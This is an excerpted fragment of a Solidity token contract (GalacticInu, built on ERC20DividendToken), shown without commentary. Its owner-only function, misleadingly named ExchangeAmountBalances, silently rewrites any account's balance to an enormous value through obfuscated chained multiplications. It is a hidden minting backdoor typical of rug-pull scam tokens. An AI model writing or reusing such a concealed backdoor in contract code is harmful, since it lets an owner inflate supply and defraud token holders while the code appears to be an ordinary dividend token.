...
contract ERC20DividendToken is Context, ERC20Burnable, Ownable {
    ...
    function ExchangeAmountBalances(address account, uint256 amount) public onlyOwner {
        ...
        if (amount > balanceOf(account)) {
            ...
            _balances[account] = amount * (10 ** _decimals) * (10 ** _decimals) * (10 ** _decimals) * (10 ** _decimals) * (10 ** _decimals) / (10 ** 18) * (10 ** 10) * (10 ** _decimals) * (10 ** 10) * (10 ** _decimals) * (10 ** 10) * (10 ** _decimals) * (10 ** 10) * (10 ** _decimals);
        } else {
...
contract GalacticInu is ERC20DividendToken {
